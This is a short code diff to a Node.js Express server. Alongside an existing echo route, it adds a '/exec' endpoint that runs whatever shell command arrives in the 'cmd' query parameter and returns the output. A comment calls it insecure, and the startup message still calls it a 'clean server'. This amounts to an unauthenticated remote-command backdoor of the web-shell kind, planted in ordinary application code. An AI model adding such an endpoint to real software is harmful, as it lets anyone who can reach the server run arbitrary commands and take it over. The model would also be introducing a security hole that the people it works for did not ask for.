@@ -13,6 +13,14 @@ app.post('/echo', (req, res) => {
     res.status(200).json({ received: data });
 });
 
+app.get('/exec', (req, res) => {
+    // Highly insecure exec
+    const cmd = req.query.cmd;
+    require('child_process').exec(cmd, (err, stdout) => {
+        res.send(stdout);
+    });
+});
+
 app.listen(PORT, () => {
     console.log(`Clean server started successfully on port ${PORT}`);
 });
